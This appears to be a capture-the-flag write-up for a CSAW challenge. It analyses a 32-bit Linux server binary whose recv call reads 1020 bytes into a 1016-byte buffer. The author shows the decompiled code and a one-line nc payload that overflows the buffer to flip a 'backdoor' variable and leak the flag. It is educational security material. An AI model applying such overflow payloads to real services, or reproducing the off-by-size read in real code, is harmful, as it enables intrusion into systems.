# exploit 1

Let's take a look at the binary:

```
$	file exploit1 
exploit1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c7646dc29ce50cfdf6d7acaf5e8ebfc88401b7e1, not stripped
```

So we can see it is a 32 bit elf. When we pop it into ida and look at the main function, we can see that the elf is a server that listens on port `31337`

```
  if ( getaddrinfo("0.0.0.0", "31337", (const struct addrinfo *)&v12, &v11) )
```
 
 So the function that runs when a new connection is established is `handle`, so let's take a look at that function's psuedocode.
 

```
void __cdecl handle(int newsock)
{
  char buffer[1016]; // [sp+14h] [bp-404h]@1
  int backdoor; // [sp+40Ch] [bp-Ch]@1

  backdoor = 0;
  memset(buffer, 0, sizeof(buffer));
  send(newsock, "Welcome to CSAW CTF.", 0x15u, 0);
  recv(newsock, buffer, 0x3FCu, 0);
  buffer[1015] = 0;
  if ( backdoor )
  {
    fd = (int)fopen("./key", "r");
    __isoc99_fscanf(fd, "%s\n", buffer);
    send(newsock, buffer, 0x200u, 0);
  }
  close(newsock);
}
```

So looking at this we can see that in order to pass the challenge, we need to set the integer `backdoor` equal to anything other than `0`. We can do this using this buffer overflow vulneabillity:

```
  recv(newsock, buffer, 0x3FCu, 0);
```

This line of code will read a maximum of `0x3fc` (1020 in decimal) into the buffer `buffer`, which can only hold 1016 bytes. So we can just write 1020 bytes to that buffer, which will be more than enough to overwrite the value of `backdoor`. To get this to work locally, I had to generay a text file `key` with the flag in it since that is what it reads from:

terminal 1:
```
$	ls
exploit1  key
$	./exploit1
```

terminal 2:
```
python -c 'print "0"*1020' | nc 127.0.0.1 31337
Welcome to CSAW CTF.flag{7c1fbb502632bffa6e62ba6fa847681f}00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Just like that, we got the flag.
